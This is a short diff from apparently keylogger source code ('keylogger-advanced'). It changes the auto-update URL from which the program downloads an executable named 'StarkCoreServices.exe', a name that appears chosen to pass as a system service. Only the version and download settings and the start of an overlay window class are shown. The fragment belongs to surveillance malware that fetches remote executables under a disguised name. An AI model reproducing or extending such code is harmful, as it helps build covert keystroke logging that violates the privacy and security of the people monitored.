@@ -137,7 +137,7 @@ finally:
     VERSION = "4.0"
     # Actual GitHub Raw URLs - UPDATED FOR NEW EXE NAME
     VERSION_URL = "https://raw.githubusercontent.com/Pranavfr/keylogger-advanced/main/version.txt" 
-    EXE_URL = "https://github.com/Pranavfr/keylogger-advanced/raw/main/dist/StarkCoreServices.exe"
+    EXE_URL = "https://github.com/Pranavfr/keylogger-advanced/raw/main/StarkCoreServices.exe"
 
 
     class SystemOverlay(QMainWindow):
